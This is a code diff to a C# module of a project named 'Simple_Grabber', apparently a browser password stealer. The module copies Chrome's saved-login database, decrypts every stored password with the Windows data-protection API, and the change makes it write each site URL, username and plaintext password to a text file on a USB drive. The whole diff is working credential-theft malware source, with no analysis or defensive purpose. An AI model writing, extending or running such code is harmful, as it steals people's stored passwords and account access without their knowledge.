@@ -23,11 +23,23 @@ namespace Simple_Grabber.Modules
 
         public static string FolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
         
-        public static void GetDatabaseEntries()
+        private static StringBuilder GetDatabaseEntries()
         {
+            var databaseEntries = new StringBuilder();
+            
             // Create a copy of the database - Chrome has the original database open and is therefore locked
 
-            File.Copy(FolderPath + @"\Login Data", FolderPath + @"\Login Data Copy");
+            if(File.Exists(FolderPath + @"\Login Data Copy"))
+            {
+                File.Delete(FolderPath + @"\Login Data Copy");
+
+                File.Copy(FolderPath + @"\Login Data", FolderPath + @"\Login Data Copy");
+            }
+
+            else
+            {
+                File.Copy(FolderPath + @"\Login Data", FolderPath + @"\Login Data Copy");
+            }
 
             using (var connection = new SQLiteConnection("Data Source=" + FolderPath + @"\Login Data Copy"))
             {
@@ -49,15 +61,27 @@ namespace Simple_Grabber.Modules
 
                     var decryptedPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(user.Password_value, null, DataProtectionScope.CurrentUser));
 
-                    Console.WriteLine($"{user.Action_url} : {user.Username_value} : {decryptedPassword}");
-
-                    Console.ReadKey();
+                    databaseEntries.AppendLine($"{user.Action_url} : {user.Username_value} : {decryptedPassword}");
                 }
             }
 
             // Delete the database copy
 
             File.Delete(FolderPath + @"\Login Data Copy");
+
+            return databaseEntries;
+        }
+
+        public static void WriteToFile(string USBPath)
+        {
+            var databaseEntries = GetDatabaseEntries();
+
+            if (!File.Exists(USBPath + @"Data\Chrome.txt"))
+            {
+                File.Create(USBPath + @"Data\Chrome.txt");
+            }
+
+            File.WriteAllText(USBPath + @"Data\Chrome.txt", databaseEntries.ToString());    
         }
     }
 }
